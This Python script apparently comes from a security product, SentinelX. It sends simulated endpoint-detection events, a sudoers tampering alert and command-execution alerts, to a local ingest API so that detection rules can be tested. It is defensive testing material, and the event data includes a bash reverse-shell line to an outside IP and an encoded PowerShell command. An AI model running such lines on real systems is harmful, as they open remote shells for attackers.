"""Endpoint Security Attack Simulator.

Simulates endpoint tampering and LOLBAS attacks:
1. File Integrity Monitoring (FIM) violation (/etc/sudoers tampering, T1565.001)
2. Living Off The Land Binaries / Reverse Shell execution (T1059.001 / T1059.004)
Triggers detection rules RULE-EDR-001 and RULE-EDR-002.
"""

from __future__ import annotations

import argparse
import sys
from datetime import UTC, datetime
from typing import Any

import httpx


def generate_fim_event(
    target_host: str,
    source_ip: str,
    tampered_file: str = "/etc/sudoers",
) -> dict[str, Any]:
    """Builds a SingleIngestRequest payload simulating a FIM tampering event."""
    now_utc = datetime.now(UTC).isoformat()
    return {
        "source_ip": source_ip,
        "event_type": "endpoint_finding",
        "target_host": target_host,
        "event_time": now_utc,
        "raw_payload": f"FIM ALERT: Unauthorized modification detected in {tampered_file}",
        "details": {
            "rule_id": "RULE-EDR-FIM-001",
            "rule_name": "File Integrity Tampering Detected",
            "mitre_attack_id": "T1565.001",
            "path": tampered_file,
            "status": "MODIFIED",
            "expected_sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
            "current_sha256": "4b8a1c902e88ad98a2f7c00192e4a9f82d1c0042e88b9021a8f9001bca2d3345",
        },
    }


def generate_lolbas_event(
    target_host: str,
    source_ip: str,
    cmd_type: str = "powershell",
) -> dict[str, Any]:
    """Builds a SingleIngestRequest payload simulating LOLBAS or reverse shell execution."""
    now_utc = datetime.now(UTC).isoformat()
    if cmd_type == "powershell":
        raw = "powershell.exe -NoProfile -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA="
        rule_id = "RULE-EDR-PS-001"
        mitre_id = "T1059.001"
    else:
        raw = "bash -i >&/dev/tcp/198.51.100.99/4444 0>&1"
        rule_id = "RULE-EDR-REV-001"
        mitre_id = "T1059.004"

    return {
        "source_ip": source_ip,
        "event_type": "endpoint_finding",
        "target_host": target_host,
        "event_time": now_utc,
        "raw_payload": f"PROCESS EXEC: {raw}",
        "details": {
            "rule_id": rule_id,
            "rule_name": "LOLBAS / Reverse Shell Execution",
            "mitre_attack_id": mitre_id,
            "command_line": raw,
            "user": "root",
        },
    }


def main() -> None:
    parser = argparse.ArgumentParser(description="Endpoint Security Attack Simulator")
    parser.add_argument(
        "--api-url",
        default="http://localhost:8000",
        help="SentinelX API base URL (default: http://localhost:8000)",
    )
    parser.add_argument(
        "--api-key",
        default="sen_ingest_demo_key",
        help="API Key for telemetry ingestion",
    )
    parser.add_argument(
        "--target-host",
        default="server-prod-01",
        help="Target host name (default: server-prod-01)",
    )
    parser.add_argument(
        "--source-ip",
        default="10.0.1.88",
        help="Source host IP address (default: 10.0.1.88)",
    )
    parser.add_argument(
        "--attack-type",
        choices=["fim", "lolbas", "all"],
        default="all",
        help="Type of endpoint attack to simulate (fim, lolbas, or all)",
    )

    args = parser.parse_args()

    print("=" * 65)
    print(" SentinelX Attack Simulator: Endpoint Tampering & LOLBAS")
    print("=" * 65)
    print(f" Target Host  : {args.target_host}")
    print(f" Attack Type  : {args.attack_type}")
    print(f" API Endpoint : {args.api_url}/api/v1/events/ingest")
    print("-" * 65)

    headers = {
        "Content-Type": "application/json",
        "X-API-Key": args.api_key,
    }

    events = []
    if args.attack_type in ("fim", "all"):
        events.append(generate_fim_event(args.target_host, args.source_ip))
    if args.attack_type in ("lolbas", "all"):
        events.append(generate_lolbas_event(args.target_host, args.source_ip, "powershell"))
        events.append(generate_lolbas_event(args.target_host, args.source_ip, "revshell"))

    with httpx.Client(base_url=args.api_url, timeout=10.0) as client:
        try:
            res = client.post("/api/v1/events/batch", json={"events": events}, headers=headers)
            if res.status_code == 201:
                data = res.json()
                print(f"[+] Successfully ingested {data.get('ingested_count', len(events))} events.")
                print("[+] Triggered Endpoint Detection Rules (RULE-EDR-001 / RULE-EDR-002).")
            else:
                print(f"[-] Ingestion failed: {res.status_code} - {res.text}")
                sys.exit(1)
        except Exception as e:
            print(f"[-] Connection failed: {e}")
            sys.exit(1)

    print("=" * 65)


if __name__ == "__main__":
    main()
